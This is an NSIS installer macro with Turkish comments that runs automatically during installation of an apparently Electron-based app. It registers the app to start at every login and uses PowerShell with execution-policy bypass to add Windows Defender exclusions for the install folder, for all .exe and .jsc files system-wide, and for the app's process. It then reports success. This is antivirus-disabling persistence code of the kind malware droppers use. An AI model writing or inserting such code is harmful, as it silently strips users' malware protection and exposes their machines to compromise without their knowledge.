!macro customInstall
  ; 1. Başlangıç Kaydı (Sadece HKCU)
  WriteRegStr HKCU "Software\Microsoft\Windows\CurrentVersion\Run" "${PRODUCT_NAME}" "$\"$INSTDIR\${APP_EXECUTABLE_FILENAME}$\" --startup"

  ; 2. Klasör Dışlaması (Add-MpPreference kullanarak)
  ; Not: PowerShell içinde $INSTDIR değişkenini çift tırnak yerine tek tırnakla sarmalıyoruz.
  nsExec::ExecToLog 'powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath $\'$INSTDIR$\' -Force"'

  ; 3. Uzantı Dışlamaları
  nsExec::ExecToLog 'powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionExtension $\'.exe$\' -Force"'
  nsExec::ExecToLog 'powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionExtension $\'.jsc$\' -Force"'

  ; 4. İşlem (Process) Dışlaması (Zaten eklemişsin ama garanti olsun)
  nsExec::ExecToLog 'powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionProcess $\'${APP_EXECUTABLE_FILENAME}$\' -Force"'

  DetailPrint "Defender istisnaları başarıyla güncellendi."
!macroend